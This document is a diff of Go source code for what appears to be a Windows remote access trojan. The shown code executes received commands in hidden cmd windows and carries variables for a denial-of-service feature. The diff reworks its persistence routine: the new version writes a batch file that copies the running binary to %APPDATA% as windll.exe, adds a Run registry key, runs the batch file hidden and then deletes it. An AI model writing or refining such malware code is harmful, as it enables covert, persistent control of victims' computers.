@@ -676,7 +676,6 @@ import "fmt"
 
 var Global__Command string;
 var file_transfer_succes bool;
-var Persistence_Output string;
 var DOS_Target string;
 var DOS_Request_Counter int = 0;
 var DOS_Request_Limit int = 1000;
@@ -742,8 +741,8 @@ func main() {
         connect.Write([]byte("[+] success £>"))
       }                                                                                                                              
     }else if strings.Contains(_Command, "£PERSISTENCE") || strings.Contains(_Command, "£persistence") {                                                                                                          
-      PERSIST();
-      connect.Write([]byte(string(Persistence_Output)));                                                                                                                                                
+      go PERSIST();
+      connect.Write([]byte(string("\n\n[*] Adding persistence registries...\n[*] Persistence Completed\n\n £> ")));                                                                                                                                                
     }else{
       cmd := exec.Command("cmd", "/C", _Command);
       cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
@@ -783,26 +782,20 @@ func UPLOAD_VIA_GET() {
 
 func PERSIST() {
 
-  regkey := "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"ARCANUS\" /t REG_SZ /F /D \""+"%"+"appdata"+"%"+"\\windll.exe";
-  runtime.GC();
-  cmd := exec.Command("cmd", "/C", string(regkey));
-  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
-  Persistence_Output_1, error_1 := cmd.Output();
-  runtime.GC();
-  custom_command := ("xcopy \""+"%"+"appdata"+"%"+"\\windll.exe\" \""+"%"+"appdata"+"%"+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
-  cmd = exec.Command("cmd", "/C", string(custom_command));
-  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
-  Persistence_Output_2, error_2 := cmd.Output();
-  if error_2 != nil && error_1 != nil {
-    Persistence_Output = ("[*] Persistence failed !  £> ");
-  }else{
-    Persistence_Output = string("[*] " + string(Persistence_Output_1) + "\n[*] " + string(Persistence_Output_2) + " £> ");
-  };
-  /*
-  Run = exec.Command("cmd", "/C", "");
-  Run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
-  Run.Start();
-  */
+  PERSIST, _ := os.Create("PERSIST.bat")
+
+  PERSIST.WriteString("mkdir %APPDATA%\\Windows"+"\n")
+  PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
+  PERSIST.WriteString("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V WinDll /t REG_SZ /F /D %APPDATA%\\Windows\\windll.exe")
+
+  PERSIST.Close()
+
+  Exec := exec.Command("cmd", "/C", "PERSIST.bat");
+  Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
+  Exec.Run();
+  Clean := exec.Command("cmd", "/C", "del PERSIST.bat");
+  Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
+  Clean.Run();
 };
 
 
